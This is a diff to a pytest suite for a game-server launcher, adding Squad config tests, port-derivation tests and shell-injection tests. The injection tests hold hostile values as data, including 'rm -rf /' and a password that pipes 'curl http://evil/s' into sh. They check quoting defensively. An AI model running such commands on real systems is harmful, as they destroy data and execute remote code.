@@ -42,7 +42,7 @@ def test_every_profile_can_run_somewhere(appid):
 def test_args_only_use_known_placeholders(appid):
     """A typo'd placeholder would blow up at launch, not here."""
     import string
-    known = {"dir", "name", "port", "password", "players"}
+    known = {"dir", "name", "port", "password", "players", "query_port", "rcon_port"}
     for _lit, field, _spec, _conv in string.Formatter().parse(profiles.PROFILES[appid]["args"]):
         if field:
             assert field in known, f"{appid} uses unknown placeholder {{{field}}}"
@@ -118,10 +118,10 @@ def test_dayz_class_block_survives_rendering():
     assert "class Missions" in out and "template = \"dayzOffline.chernarusplus\";" in out
 
 
-def test_sii_braces_survive_rendering():
-    out = gs.render_config(1948160, "server_config.sii", rec(server_appid=1948160))
-    assert out.startswith("SiiNunit")
-    assert "server_config : _nameless.1 {" in out
+def test_squad_config_renders_without_mangling():
+    out = gs.render_config(403240, "SquadGame/ServerConfig/Server.cfg",
+                           rec(server_appid=403240, name="squad-main"))
+    assert 'ServerName="squad-main"' in out
 
 
 def test_admin_password_falls_back_to_server_password():
@@ -162,10 +162,11 @@ async def test_writes_configs_and_skips_existing(tmp_path, monkeypatch):
 async def test_writes_nested_config_paths(tmp_path, monkeypatch):
     monkeypatch.setattr(gs, "BASE_DIR", tmp_path)
     monkeypatch.setattr(gs, "SSH_HOST", "")
-    r = rec(name="dst-main", server_appid=343050, port=10999)
+    r = rec(name="squad-main", server_appid=403240, port=7787)
     written = await gs.write_configs(r)
-    assert sorted(written) == ["cluster/Master/server.ini", "cluster/cluster.ini"]
-    assert (gs.install_dir(r) / "cluster" / "Master" / "server.ini").is_file()
+    assert sorted(written) == ["SquadGame/ServerConfig/Admins.cfg",
+                               "SquadGame/ServerConfig/Server.cfg"]
+    assert (gs.install_dir(r) / "SquadGame" / "ServerConfig" / "Server.cfg").is_file()
 
 
 @pytest.mark.asyncio
@@ -222,3 +223,55 @@ def test_verifier_finds_slug_suffixed_install_dirs(tmp_path):
     d.mkdir()
     (d / "valheim_server.x86_64").touch()
     assert verify_profiles.check(896660, profiles.PROFILES[896660], tmp_path)["state"] == "ok"
+
+
+# ------------------------------------------------- shell safety -----------
+@pytest.mark.parametrize("nasty", [
+    'srv"; touch /tmp/pwned; #',
+    "srv' ; rm -rf / ; '",
+    "srv$(id)",
+    "srv`id`",
+    "srv\nid",
+])
+def test_server_names_cannot_inject_shell_commands(nasty):
+    """build_launch output goes to `bash -lc`, so every value must be quoted."""
+    import shlex
+    cmd = gs.build_launch({"name": nasty, "server_appid": 896660, "port": 2456,
+                           "server_password": "pw", "max_players": 10})
+    tokens = shlex.split(cmd)          # raises if quoting is broken
+    assert nasty in tokens             # survives intact as ONE argument
+
+
+def test_passwords_cannot_inject_shell_commands():
+    import shlex
+    evil = "pw; curl http://evil/s | sh; #"
+    cmd = gs.build_launch({"name": "srv", "server_appid": 896660, "port": 2456,
+                           "server_password": evil, "max_players": 10})
+    assert evil in shlex.split(cmd)
+
+
+def test_ports_are_coerced_to_integers():
+    """A string port must never reach the command line as arbitrary text."""
+    with pytest.raises((ValueError, TypeError)):
+        gs.build_launch({"name": "srv", "server_appid": 896660,
+                         "port": "2456; id", "max_players": 10})
+
+
+# ------------------------------------------------- port derivation --------
+def test_query_port_respects_a_per_record_override():
+    """Two servers of one game must be able to use different query ports."""
+    base = {"server_appid": 376030, "port": 7777}
+    assert profiles.query_port(base) == 27015
+    assert profiles.query_port({**base, "query_port": 27017}) == 27017
+
+
+def test_rust_query_port_follows_its_game_port():
+    assert profiles.query_port({"server_appid": 258550, "port": 28015}) == 28017
+    assert profiles.query_port({"server_appid": 258550, "port": 28025}) == 28027
+
+
+def test_ark_rcon_port_comes_from_the_record():
+    """ARK SE and ASA both default to 27020; one of them has to move."""
+    cmd = gs.build_launch({"name": "asa", "server_appid": 2430930, "port": 7778,
+                           "server_password": "pw", "rcon_port": 27021})
+    assert "RCONPort=27021" in cmd
